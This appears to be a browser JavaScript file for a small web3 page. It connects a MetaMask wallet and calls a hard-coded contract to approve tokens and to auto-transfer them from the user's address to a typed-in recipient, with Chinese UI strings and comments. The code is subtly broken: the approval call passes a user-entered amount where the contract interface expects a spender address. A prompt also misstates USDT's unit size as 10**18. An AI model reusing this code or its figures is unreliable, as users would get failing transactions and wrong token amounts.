window.addEventListener('load', async () => {
    const connectWalletButton = document.getElementById('connectWallet');
    const approveButton = document.getElementById('approveButton');
    const transferButton = document.getElementById('transferButton');
    const walletInfo = document.getElementById('walletInfo');
    const walletAddress = document.getElementById('walletAddress');
    const status = document.getElementById('status');

    let web3;
    let userAccount;
    const contractAddress = "0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2"; // 替换为你的合约地址

    const contractABI = [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "tokenAddress",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                }
            ],
            "name": "approveForTransfer",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "tokenAddress",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                }
            ],
            "name": "automateApproval",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "tokenAddress",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                }
            ],
            "name": "autoTransferTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ];

    // 检查 MetaMask 是否安装
    if (typeof window.ethereum !== 'undefined') {
        console.log('MetaMask 已安装！');

        connectWalletButton.addEventListener('click', async () => {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];

                walletAddress.textContent = userAccount;
                walletInfo.classList.remove('hidden');
                status.textContent = '钱包已连接: ' + userAccount;

                web3 = new Web3(window.ethereum);
            } catch (error) {
                console.error('连接钱包时出错:', error);
                status.textContent = '连接钱包失败。';
            }
        });

        // 授权按钮点击事件
        approveButton.addEventListener('click', async () => {
            if (!userAccount) {
                alert('请先连接钱包！');
                return;
            }

            const tokenAddress = prompt("请输入代币地址:");
            const amount = prompt("请输入授权数量（以最小单位计，例如 USDT 的 1 USDT 为 10**18）:");
            
            console.log(`Token Address: ${tokenAddress}, Amount: ${amount}`); // 调试信息

            if (tokenAddress && amount) {
                try {
                    const contract = new web3.eth.Contract(contractABI, contractAddress);
                    await contract.methods.approveForTransfer(tokenAddress, userAccount, amount).send({ from: userAccount });
                    status.textContent = '授权成功！';
                } catch (error) {
                    console.error('授权时出错:', error);
                    status.textContent = '授权失败。';
                }
            } else {
                alert('请提供有效的代币地址和授权数量。');
            }
        });

        // 转账按钮点击事件
        transferButton.addEventListener('click', async () => {
            if (!userAccount) {
                alert('请先连接钱包！');
                return;
            }

            const tokenAddress = prompt("请输入代币地址:");
            const toAddress = prompt("请输入接收地址:");
            
            console.log(`Token Address: ${tokenAddress}, To Address: ${toAddress}`); // 调试信息

            if (tokenAddress && toAddress) {
                try {
                    const contract = new web3.eth.Contract(contractABI, contractAddress);
                    await contract.methods.autoTransferTokens(tokenAddress, userAccount, toAddress).send({ from: userAccount });
                    status.textContent = '转账成功！';
                } catch (error) {
                    console.error('转账时出错:', error);
                    status.textContent = '转账失败。';
                }
            } else {
                alert('请提供有效的代币地址和接收地址。');
            }
        });

    } else {
        alert('请安装 MetaMask。');
    }
});
